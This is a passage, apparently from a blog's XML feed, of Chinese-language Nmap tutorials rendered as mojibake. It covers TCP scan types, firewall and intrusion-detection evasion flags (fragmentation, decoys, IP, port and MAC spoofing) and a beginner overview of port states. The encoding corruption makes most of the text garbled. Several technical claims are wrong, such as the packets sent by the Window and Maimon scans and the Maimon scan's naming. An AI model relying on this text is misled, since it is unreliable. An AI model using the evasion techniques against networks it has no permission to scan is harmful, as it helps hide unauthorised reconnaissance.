‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚ç¼ºä¹ SYN æ ‡å¿—ä½çš„ TCP FIN æŠ¥æ–‡é€šå¸¸åœ¨æ­£å¸¸æ“ä½œä¸­æ˜¯ä¸åˆæ³•çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæ”¶åˆ°å“åº”ï¼Œåˆ™å¯èƒ½è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚  </p></blockquote><h4 id="6-TCP-Xmas-æ‰«æ"><a href="#6-TCP-Xmas-æ‰«æ" class="headerlink" title="6 TCP Xmas æ‰«æ"></a>6 TCP Xmas æ‰«æ</h4><blockquote><p>nmap -sX ip</p></blockquote><p>TCP Xmasï¼ˆä¹Ÿç§°ä¸ºChristmas Treeï¼‰æ‰«ææ˜¯ Nmap å·¥å…·ä¸­çš„ä¸€ç§æ‰«ææŠ€æœ¯ï¼Œç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚TCP Xmas æ‰«æå°è¯•åˆ©ç”¨ TCP åè®®çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³å‘é€ä¸€ä¸ªæ‰€æœ‰æ ‡å¿—ä½å‡è¢«è®¾ç½®ä¸º 1 çš„ TCP æŠ¥æ–‡ï¼Œæ¥åˆ¤æ–­ç«¯å£çš„çŠ¶æ€ã€‚</p><p>ä»¥ä¸‹æ˜¯ TCP Xmas æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å‘é€TCP Xmas åŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªæ‰€æœ‰æ ‡å¿—ä½å‡è¢«è®¾ç½®ä¸º 1 çš„ TCP æŠ¥æ–‡ï¼Œå³FINã€PSHã€URGæ ‡å¿—ä½å‡è¢«è®¾ç½®ä¸º 1ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºé€šå¸¸ä¼šå¿½ç•¥ TCP Xmas æŠ¥æ–‡ï¼Œä¸å‘é€ä»»ä½•å“åº”ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šå‘é€ä¸€ä¸ª TCP RSTï¼ˆå¤ä½ï¼‰åŒ…ï¼Œè¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚ç¼ºä¹æ ‡å‡†æ ‡å¿—ä½çš„ TCP Xmas æŠ¥æ–‡é€šå¸¸åœ¨æ­£å¸¸æ“ä½œä¸­æ˜¯ä¸åˆæ³•çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæ”¶åˆ°å“åº”ï¼Œåˆ™å¯èƒ½è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚</p></blockquote><h4 id="7-TCP-ACK-æ‰«æ"><a href="#7-TCP-ACK-æ‰«æ" class="headerlink" title="7 TCP ACK æ‰«æ"></a>7 TCP ACK æ‰«æ</h4><blockquote><p>nmap -sA ip</p></blockquote><p>TCP ACKï¼ˆAcknowledgmentï¼‰æ‰«ææ˜¯ Nmap å·¥å…·ä¸­çš„ä¸€ç§æ‰«ææŠ€æœ¯ï¼Œç”¨äºç¡®å®šç›®æ ‡ä¸»æœºä¸Šçš„ç«¯å£çŠ¶æ€ã€‚ä¸å…¶ä»– TCP æ‰«ææŠ€æœ¯ä¸åŒï¼ŒTCP ACK æ‰«æä¸å…³å¿ƒç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œè€Œæ˜¯ä¸“æ³¨äºè·å–ç›®æ ‡ä¸»æœºå¯¹ç‰¹å®šç«¯å£çš„å“åº”ã€‚</p><p>ä»¥ä¸‹æ˜¯ TCP ACK æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å‘é€TCP ACKåŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªåªè®¾ç½® ACK æ ‡å¿—ä½çš„ TCP æŠ¥æ–‡ã€‚<br>ç­‰å¾…å“åº”ï¼š æ— è®ºç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ï¼Œç›®æ ‡ä¸»æœºé€šå¸¸ä¼šè¿”å›ä¸€ä¸ª TCP RSTï¼ˆå¤ä½ï¼‰åŒ…ï¼Œè¡¨ç¤ºå¯¹æœªå»ºç«‹è¿æ¥çš„ ACK è¯·æ±‚çš„æ‹’ç»ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚å¦‚æœæ”¶åˆ° TCP RST åŒ…ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼›å¦‚æœæ²¡æœ‰æ”¶åˆ°å“åº”ï¼Œè¯´æ˜ç«¯å£å¯èƒ½æ˜¯å¼€æ”¾çš„æˆ–ç”±é˜²ç«å¢™è¿‡æ»¤ã€‚</p></blockquote><p>####8 TCP çª—å£æ‰«æ</p><blockquote><p>nmap -sW ip</p></blockquote><p>TCPçª—å£æ‰«ææ˜¯ä¸€ç§ç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾ç«¯å£çš„æ‰«ææŠ€æœ¯ã€‚è¿™ç§æ‰«ææŠ€æœ¯ä¸»è¦å…³æ³¨TCPåè®®ä¸­çš„çª—å£å­—æ®µï¼ˆWindow Sizeï¼‰ã€‚</p><blockquote><p>TCPçª—å£æ‰«æçš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š<br>å‘é€TCPåŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªTCPåŒ…ï¼Œå…¶ä¸­SYNæ ‡å¿—ä½è¢«è®¾ç½®ï¼Œä½†ä¸è®¾ç½®ACKæ ‡å¿—ä½ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºä¼šå“åº”ä¸€ä¸ªåŒ…ï¼Œå…¶ä¸­SYNå’ŒACKæ ‡å¿—ä½éƒ½è¢«è®¾ç½®ï¼Œå¹¶ä¸”TCPçª—å£å­—æ®µåŒ…å«ä¸€ä¸ªéé›¶çš„å€¼ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šå“åº”ä¸€ä¸ªRSTï¼ˆå¤ä½ï¼‰åŒ…ï¼Œæˆ–è€…æ ¹æœ¬ä¸å“åº”ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚å¦‚æœæ”¶åˆ°SYN&#x2F;ACKå“åº”ï¼Œå¹¶ä¸”TCPçª—å£å­—æ®µçš„å€¼ä¸ä¸ºé›¶ï¼Œé‚£ä¹ˆç«¯å£å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœæ”¶åˆ°RSTå“åº”æˆ–è€…æ ¹æœ¬æ²¡æœ‰å“åº”ï¼Œé‚£ä¹ˆç«¯å£å¯èƒ½æ˜¯å…³é—­çš„ã€‚</p></blockquote><h4 id="9-TCP-Maimon-æ‰«æ"><a href="#9-TCP-Maimon-æ‰«æ" class="headerlink" title="9 TCP Maimon æ‰«æ"></a>9 TCP Maimon æ‰«æ</h4><blockquote><p>nmap -sM ip</p></blockquote><p>åœ¨ç½‘ç»œæ‰«æé¢†åŸŸä¸­ï¼ŒTCP Maimon Scanï¼ˆåˆç§° Maimonides Scanï¼‰æ˜¯ä¸€ç§æ¯”è¾ƒç½•è§çš„æ‰«ææŠ€æœ¯ï¼Œå…¶å‘½åæ¥æºäºå¤ä»£çŠ¹å¤ªå­¦è€…æ‹‰æ¯”Â·è«è¥¿Â·é©¬è’™å°¼å¾·æ–¯ï¼ˆMoses Maimonidesï¼‰ã€‚è¯¥æ‰«ææŠ€æœ¯åˆ©ç”¨äº† TCP åè®®çš„ä¸€äº›ç‰¹æ€§æ¥ç¡®å®šç›®æ ‡ä¸»æœºä¸Šçš„ç«¯å£çŠ¶æ€ã€‚</p><p>TCP Maimon Scan çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><blockquote><p>å‘é€TCPåŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªTCPåŒ…ï¼Œå…¶ä¸­SYNå’ŒRSTæ ‡å¿—ä½éƒ½è¢«è®¾ç½®ï¼ŒåŒæ—¶TCPçª—å£å­—æ®µè®¾ç½®ä¸ºé›¶ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºä¼šå“åº”ä¸€ä¸ªåŒ…ï¼Œå…¶ä¸­SYNã€ACKå’ŒRSTæ ‡å¿—ä½éƒ½è¢«è®¾ç½®ï¼ŒåŒæ—¶TCPçª—å£å­—æ®µåŒ…å«ä¸€ä¸ªéé›¶çš„å€¼ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šå“åº”ä¸€ä¸ªRSTåŒ…ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚å¦‚æœæ”¶åˆ°SYN&#x2F;ACK&#x2F;RSTå“åº”ï¼Œå¹¶ä¸”TCPçª—å£å­—æ®µçš„å€¼ä¸ä¸ºé›¶ï¼Œé‚£ä¹ˆç«¯å£å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœæ”¶åˆ°RSTå“åº”ï¼Œé‚£ä¹ˆç«¯å£å¯èƒ½æ˜¯å…³é—­çš„ã€‚  </p></blockquote><h3 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h3><h4 id="1-æŠ¥æ–‡åˆ†æ®µ"><a href="#1-æŠ¥æ–‡åˆ†æ®µ" class="headerlink" title="1 æŠ¥æ–‡åˆ†æ®µ"></a>1 æŠ¥æ–‡åˆ†æ®µ</h4><blockquote><p>nmap -f ip</p></blockquote><p>-f å‚æ•°ç”¨äºåœ¨å‘é€çš„TCPæ•°æ®åŒ…ä¸­è¿›è¡ŒæŠ¥æ–‡åˆ†æ®µï¼ˆfragmentationï¼‰ã€‚æŠ¥æ–‡åˆ†æ®µæ˜¯å°†å¤§çš„æ•°æ®åŒ…åˆ†æˆæ›´å°çš„ç‰‡æ®µä»¥é€‚åº”ç½‘ç»œä¼ è¾“çš„è¿‡ç¨‹ã€‚åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸï¼ŒæŠ¥æ–‡åˆ†æ®µç»å¸¸ç”¨äºç»•è¿‡ä¸€äº›ç½‘ç»œé˜²ç«å¢™æˆ–å…¥ä¾µæ£€æµ‹ç³»ç»Ÿçš„æ£€æµ‹ã€‚ä¸€äº›é˜²ç«å¢™å’ŒIDS&#x2F;IPSç³»ç»Ÿåœ¨å¤„ç†å¤§æ•°æ®åŒ…æ—¶å¯èƒ½ä¼šå­˜åœ¨æ¼æ´ï¼Œé€šè¿‡å°†æ•°æ®åŒ…åˆ†æˆå°ç‰‡æ®µï¼Œå¯ä»¥å°è¯•ç»•è¿‡è¿™äº›å®‰å…¨è®¾å¤‡çš„æ£€æµ‹ã€‚ </p><h4 id="2-æœ€å¤§ä¼ è¾“å•å…ƒ"><a href="#2-æœ€å¤§ä¼ è¾“å•å…ƒ" class="headerlink" title="2 æœ€å¤§ä¼ è¾“å•å…ƒ"></a>2 æœ€å¤§ä¼ è¾“å•å…ƒ</h4><blockquote><p>nmap â€“mtu 1500 ip</p></blockquote><p>â€“mtu å‚æ•°ç”¨äºæŒ‡å®šæ•°æ®åŒ…çš„æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMTUï¼‰ã€‚MTUæ˜¯æŒ‡ä¸€æ¬¡èƒ½å¤Ÿé€šè¿‡é€šä¿¡é“¾è·¯çš„æœ€å¤§æ•°æ®åŒ…å¤§å°ã€‚é€šè¿‡è°ƒæ•´MTUï¼Œå¯ä»¥å½±å“æ•°æ®åŒ…çš„å¤§å°ï¼Œä»è€Œå¯èƒ½ç»•è¿‡ä¸€äº›ç½‘ç»œè®¾å¤‡çš„æ£€æµ‹ã€‚ </p><h4 id="3-è¯±é¥µéšè—æ‰«æ"><a href="#3-è¯±é¥µéšè—æ‰«æ" class="headerlink" title="3 è¯±é¥µéšè—æ‰«æ"></a>3 è¯±é¥µéšè—æ‰«æ</h4><blockquote><p>nmap -D &lt;ip,ip,ipâ€¦â€¦&gt; ç›®æ ‡ ip</p></blockquote><p>-D å‚æ•°åœ¨Nmapä¸­ç”¨äºè¿›è¡Œè¯±é¥µï¼ˆdecoyï¼‰æ‰«æï¼Œé€šè¿‡åœ¨æ‰«æä¸­ä¼ªè£…å…¶ä»–ä¸»æœºçš„IPåœ°å€ï¼Œä½¿å¾—è¢«æ‰«æç›®æ ‡éš¾ä»¥ç¡®å®šæ‰«æçš„çœŸå®æ¥æºã€‚è¿™æœ‰åŠ©äºæ··æ·†ç›®æ ‡ä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œä½¿å…¶éš¾ä»¥è¿½è¸ªæ‰«æçš„å‘èµ·è€…ã€‚</p><h4 id="4-æºåœ°å€å“„éª—"><a href="#4-æºåœ°å€å“„éª—" class="headerlink" title="4 æºåœ°å€å“„éª—"></a>4 æºåœ°å€å“„éª—</h4><blockquote><p>nmap -S &lt;ä¼ªè£…çš„æº ip&gt; ip </p></blockquote><h4 id="5-æºç«¯å£å“„éª—"><a href="#5-æºç«¯å£å“„éª—" class="headerlink" title="5 æºç«¯å£å“„éª—"></a>5 æºç«¯å£å“„éª—</h4><blockquote><p>nmap â€“source-port æˆ– -g &lt;æºç«¯å£å·&gt; ip </p></blockquote><p>â€“source-port å’Œ -g å‚æ•°åœ¨Nmapä¸­ç”¨äºè¿›è¡Œæºç«¯å£æ¬ºéª—ï¼ˆSource Port Spoofingï¼‰ã€‚å®ƒä»¬å…è®¸ä½ æŒ‡å®šç”¨äºå‘é€æ‰«æè¯·æ±‚çš„æºç«¯å£å·ï¼Œè¿™æ ·å¯ä»¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œä¸€äº›æ··æ·†ï¼Œä½¿å¾—å…¥ä¾µæ£€æµ‹ç³»ç»Ÿéš¾ä»¥å‡†ç¡®è¿½è¸ªå’Œè¯†åˆ«æ‰«ææµé‡ã€‚ </p><h4 id="6-é™„åŠ éšæœºæ•°æ®"><a href="#6-é™„åŠ éšæœºæ•°æ®" class="headerlink" title="6  é™„åŠ éšæœºæ•°æ®"></a>6  é™„åŠ éšæœºæ•°æ®</h4><blockquote><p>nmap â€“data-length &lt;é•¿åº¦&gt; ip</p></blockquote><p>â€“data-length <number> å‚æ•°åœ¨Nmapä¸­ç”¨äºåœ¨å‘é€çš„æ•°æ®åŒ…ä¸­é™„åŠ æŒ‡å®šé•¿åº¦çš„éšæœºæ•°æ®ã€‚è¿™ä¸ªåŠŸèƒ½æœ‰åŠ©äºæ··æ·†ç›®æ ‡ä¸»æœºä¸Šçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œä½¿å¾—å¯¹æ‰«ææµé‡çš„åˆ†ææ›´åŠ å›°éš¾ã€‚</p><p>####7 ç”Ÿå­˜æ—¶é—´</p><blockquote><p>nmap â€“ttl &lt;å€¼&gt; ip </p></blockquote><p>â€“ttl <value> å‚æ•°åœ¨Nmapä¸­ç”¨äºè®¾ç½®å‘é€çš„æ•°æ®åŒ…ä¸­çš„ IP Time-To-Liveï¼ˆTTLï¼‰å­—æ®µçš„å€¼ã€‚TTLæ˜¯IPåè®®å¤´éƒ¨ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œç”¨äºæŒ‡å®šæ•°æ®åŒ…åœ¨ç½‘ç»œä¸Šçš„æœ€å¤§ç”Ÿå­˜æ—¶é—´ï¼Œé€šå¸¸ä»¥è·³æ•°ï¼ˆhopsï¼‰ä¸ºå•ä½ã€‚æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼ŒTTLå€¼å°±ä¼šå‡1ï¼Œå½“TTLå€¼å‡è‡³0æ—¶ï¼Œæ•°æ®åŒ…å°†è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”è·¯ç”±å™¨ä¼šå‘æºä¸»æœºå‘é€ä¸€ä¸ª ICMP Time Exceeded é”™è¯¯æ¶ˆæ¯ã€‚</p><h4 id="8-MAC-åœ°å€å“„éª—"><a href="#8-MAC-åœ°å€å“„éª—" class="headerlink" title="8 MAC åœ°å€å“„éª—"></a>8 MAC åœ°å€å“„éª—</h4><blockquote><p>nmap â€“spoof-mac &lt;mac åœ°å€&gt; ip </p></blockquote><p>â€“spoof-mac &lt;mac addressï¼Œprefixï¼Œor vendor name&gt; å‚æ•°åœ¨Nmapä¸­ç”¨äºè¿›è¡ŒMACåœ°å€æ¬ºéª—ï¼Œå³ä¼ªè£…å‘é€æ‰«æè¯·æ±‚çš„ä¸»æœºçš„MACåœ°å€ã€‚MACåœ°å€ï¼ˆMedia Access Control addressï¼‰æ˜¯ç½‘ç»œè®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚é€šè¿‡æ¬ºéª—ç›®æ ‡ä¸»æœºï¼Œæ”¹å˜æ‰«æè¯·æ±‚ä¸­çš„MACåœ°å€ï¼Œå¯ä»¥æ··æ·†å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œä½¿å…¶éš¾ä»¥è¿½è¸ªå’Œè¯†åˆ«æ‰«ææ¥æºã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmapåˆè¯†</title>
    <link href="/2024/09/16/Nmap%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/16/Nmap%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>webå°ç™½åˆå¼€å§‹å­¦ä¹ webäº†ï¼Œä»Šå¤©åˆæ­¥äº†è§£ä¸€ä¸‹Nmapçš„åŠŸèƒ½å’Œä½¿ç”¨æ–¹æ³•</p><h3 id="ä¸»è¦åŠŸèƒ½ï¼š"><a href="#ä¸»è¦åŠŸèƒ½ï¼š" class="headerlink" title="ä¸»è¦åŠŸèƒ½ï¼š"></a>ä¸»è¦åŠŸèƒ½ï¼š</h3><ol><li>ä¸»æœºå‘ç°ï¼š Nmap å¯ä»¥é€šè¿‡å‘é€ç½‘ç»œæ¢æµ‹åŒ…ï¼ˆping æ‰«æï¼‰æ¥ç¡®å®šä¸€ä¸ªç½‘ç»œä¸­æ´»è·ƒçš„ä¸»æœºã€‚è¿™æœ‰åŠ©äºç¡®å®šå“ªäº› IP åœ°å€ä¸Šæœ‰æ´»åŠ¨çš„è®¾å¤‡</li><li>ç«¯å£æ‰«æï¼š Nmap å¯ä»¥æ‰«æç›®æ ‡ä¸»æœºçš„å¼€æ”¾ç«¯å£ï¼Œå¸®åŠ©ç¡®å®šå“ªäº›æœåŠ¡æ­£åœ¨è¿è¡Œã€‚å®ƒæ”¯æŒå¤šç§æ‰«ææŠ€æœ¯ï¼ŒåŒ…æ‹¬ TCP æ‰«æã€UDP æ‰«æã€SYN&#x2F;ACK æ‰«æç­‰</li><li>æœåŠ¡è¯†åˆ«ï¼š Nmap å¯ä»¥è¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œçš„å…·ä½“æœåŠ¡å’Œåº”ç”¨ç¨‹åºçš„ç‰ˆæœ¬å·ã€‚è¿™å¯¹äºäº†è§£ç›®æ ‡ç³»ç»Ÿä¸Šå¯èƒ½å­˜åœ¨çš„æ¼æ´å’Œå¼±ç‚¹å¾ˆæœ‰å¸®åŠ©</li><li>æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼š Nmap èƒ½å¤Ÿå°è¯•æ£€æµ‹ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ã€‚è¿™æœ‰åŠ©äºè¯†åˆ«ç½‘ç»œä¸­çš„ä¸åŒæ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸ºåç»­çš„æ¸—é€æµ‹è¯•æä¾›ä¿¡æ¯ã€‚</li><li>è„šæœ¬æ‰«æï¼š Nmap æ”¯æŒè„šæœ¬æ‰«æï¼Œå…è®¸ç”¨æˆ·æ‰§è¡Œè‡ªå®šä¹‰è„šæœ¬ä»¥è¿›è¡Œæ›´æ·±å…¥çš„ä¿¡æ¯æ”¶é›†å’Œå®‰å…¨å®¡è®¡</li><li>ç‰ˆæœ¬æ£€æµ‹ï¼š Nmap å¯ä»¥æ£€æµ‹ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚è¿™å¯¹äºç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šå¯èƒ½å­˜åœ¨çš„å·²çŸ¥æ¼æ´å’Œå®‰å…¨é—®é¢˜éå¸¸æœ‰ç”¨ã€‚</li><li>è¾“å‡ºæ ¼å¼ï¼š Nmap å¯ä»¥ç”Ÿæˆå¤šç§è¾“å‡ºæ ¼å¼ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€XMLã€JSON ç­‰ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥çš„åˆ†æå’ŒæŠ¥å‘Š</li></ol><h3 id="ä½¿ç”¨æ–¹æ³•ï¼š"><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h3><h4 id="3-1ä¸»æœº"><a href="#3-1ä¸»æœº" class="headerlink" title="3.1ä¸»æœº"></a>3.1ä¸»æœº</h4><h5 id="3-1-1å¿«é€Ÿæ‰«æ"><a href="#3-1-1å¿«é€Ÿæ‰«æ" class="headerlink" title="3.1.1å¿«é€Ÿæ‰«æ"></a>3.1.1å¿«é€Ÿæ‰«æ</h5><blockquote><p>nmap ip  </p></blockquote><p>ä¸Šè¿°å‘½ä»¤å°†æ‰§è¡Œä¸€ä¸ªé»˜è®¤çš„ TCP ç«¯å£æ‰«æï¼Œæ˜¾ç¤ºç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£ä»¥åŠç›¸åº”çš„æœåŠ¡ä¿¡æ¯ã€‚</p><h5 id="3-1-2å¿«é€Ÿæ‰«æ"><a href="#3-1-2å¿«é€Ÿæ‰«æ" class="headerlink" title="3.1.2å¿«é€Ÿæ‰«æ"></a>3.1.2å¿«é€Ÿæ‰«æ</h5><blockquote><p>nmap ip ip   </p></blockquote><p>æ‰«æå¤šä¸ªç›®æ ‡åªéœ€è·Ÿä¸Š IP å³å¯ </p><h5 id="3-1-3-ç½‘æ®µæ‰«æ"><a href="#3-1-3-ç½‘æ®µæ‰«æ" class="headerlink" title="3.1.3 ç½‘æ®µæ‰«æ"></a>3.1.3 ç½‘æ®µæ‰«æ</h5><blockquote><p>nmap ip&#x2F;å­ç½‘æ©ç   </p></blockquote><h5 id="3-1-4-è¿‡æ»¤-IP-çš„ç½‘æ®µæ‰«æ"><a href="#3-1-4-è¿‡æ»¤-IP-çš„ç½‘æ®µæ‰«æ" class="headerlink" title="3.1.4 è¿‡æ»¤ IP çš„ç½‘æ®µæ‰«æ"></a>3.1.4 è¿‡æ»¤ IP çš„ç½‘æ®µæ‰«æ</h5><blockquote><p>nmap ip&#x2F;å­ç½‘æ©ç  -exclude éœ€è¦è¿‡æ»¤çš„ IP æˆ– æ–‡ä»¶</p></blockquote><h5 id="3-1-5-æ‰«æå­˜æ´»ä¸»æœº"><a href="#3-1-5-æ‰«æå­˜æ´»ä¸»æœº" class="headerlink" title="3.1.5 æ‰«æå­˜æ´»ä¸»æœº"></a>3.1.5 æ‰«æå­˜æ´»ä¸»æœº</h5><blockquote><p>nmap -sP ip&#x2F;å­ç½‘æ©ç  </p></blockquote><p>ä»…ä»…ç¡®å®šå­˜æ´»ä¸»æœºå¹¶ä¸æ‰«æç«¯å£</p><h4 id="3-2-ç«¯å£"><a href="#3-2-ç«¯å£" class="headerlink" title="3.2 ç«¯å£"></a>3.2 ç«¯å£</h4><h5 id="Nmapæ‰€è¯†åˆ«çš„6ä¸ªç«¯å£çŠ¶æ€"><a href="#Nmapæ‰€è¯†åˆ«çš„6ä¸ªç«¯å£çŠ¶æ€" class="headerlink" title="Nmapæ‰€è¯†åˆ«çš„6ä¸ªç«¯å£çŠ¶æ€:"></a>Nmapæ‰€è¯†åˆ«çš„6ä¸ªç«¯å£çŠ¶æ€:</h5><blockquote><p>open(å¼€æ”¾çš„)<br>åº”ç”¨ç¨‹åºæ­£åœ¨è¯¥ç«¯å£æ¥æ”¶TCP è¿æ¥æˆ–è€…UDPæŠ¥æ–‡ã€‚å‘ç°è¿™ä¸€ç‚¹å¸¸å¸¸æ˜¯ç«¯å£æ‰«æ çš„ä¸»è¦ç›®æ ‡ã€‚å®‰å…¨æ„è¯†å¼ºçš„äººä»¬çŸ¥é“æ¯ä¸ªå¼€æ”¾çš„ç«¯å£ éƒ½æ˜¯æ”»å‡»çš„å…¥å£ã€‚æ”»å‡»è€…æˆ–è€…å…¥ä¾µæµ‹è¯•è€…æƒ³è¦å‘ç°å¼€æ”¾çš„ç«¯å£ã€‚ è€Œç®¡ç†å‘˜åˆ™è¯•å›¾å…³é—­å®ƒä»¬æˆ–è€…ç”¨é˜²ç«å¢™ä¿æŠ¤å®ƒä»¬ä»¥å…å¦¨ç¢äº†åˆæ³•ç”¨æˆ·ã€‚ éå®‰å…¨æ‰«æå¯èƒ½å¯¹å¼€æ”¾çš„ç«¯å£ä¹Ÿæ„Ÿå…´è¶£ï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç½‘ç»œä¸Šé‚£äº›æœåŠ¡å¯ä¾›ä½¿ç”¨ã€‚  </p></blockquote><blockquote><p>closed(å…³é—­çš„)<br>å…³é—­çš„ç«¯å£å¯¹äºNmapä¹Ÿæ˜¯å¯è®¿é—®çš„(å®ƒæ¥å—Nmapçš„æ¢æµ‹æŠ¥æ–‡å¹¶ä½œå‡ºå“åº”)ï¼Œ ä½†æ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨å…¶ä¸Šç›‘å¬ã€‚ å®ƒä»¬å¯ä»¥æ˜¾ç¤ºè¯¥IPåœ°å€ä¸Š(ä¸»æœºå‘ç°ï¼Œæˆ–è€…pingæ‰«æ)çš„ä¸»æœºæ­£åœ¨è¿è¡Œup ä¹Ÿå¯¹éƒ¨åˆ†æ“ä½œç³»ç»Ÿæ¢æµ‹æœ‰æ‰€å¸®åŠ©ã€‚ å› ä¸ºå…³é—­çš„å…³å£æ˜¯å¯è®¿é—®çš„ï¼Œä¹Ÿè®¸è¿‡ä¼šå„¿å€¼å¾—å†æ‰«æä¸€ä¸‹ï¼Œå¯èƒ½ä¸€äº›åˆå¼€æ”¾äº†ã€‚ ç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½ä¼šè€ƒè™‘ç”¨é˜²ç«å¢™å°é”è¿™æ ·çš„ç«¯å£ã€‚ é‚£æ ·ä»–ä»¬å°±ä¼šè¢«æ˜¾ç¤ºä¸ºè¢«è¿‡æ»¤çš„çŠ¶æ€ï¼Œä¸‹é¢è®¨è®ºã€‚</p></blockquote><blockquote><p>filtered(è¢«è¿‡æ»¤çš„)<br>ç”±äºåŒ…è¿‡æ»¤é˜»æ­¢æ¢æµ‹æŠ¥æ–‡åˆ°è¾¾ç«¯å£ï¼Œ Nmapæ— æ³•ç¡®å®šè¯¥ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚è¿‡æ»¤å¯èƒ½æ¥è‡ªä¸“ä¸šçš„é˜²ç«å¢™è®¾å¤‡ï¼Œè·¯ç”±å™¨è§„åˆ™ æˆ–è€…ä¸»æœºä¸Šçš„è½¯ä»¶é˜²ç«å¢™ã€‚è¿™æ ·çš„ç«¯å£è®©æ”»å‡»è€…æ„Ÿè§‰å¾ˆæŒ«æŠ˜ï¼Œå› ä¸ºå®ƒä»¬å‡ ä¹ä¸æä¾› ä»»ä½•ä¿¡æ¯ã€‚æœ‰æ—¶å€™å®ƒä»¬å“åº”ICMPé”™è¯¯æ¶ˆæ¯å¦‚ç±»å‹3ä»£ç 13 (æ— 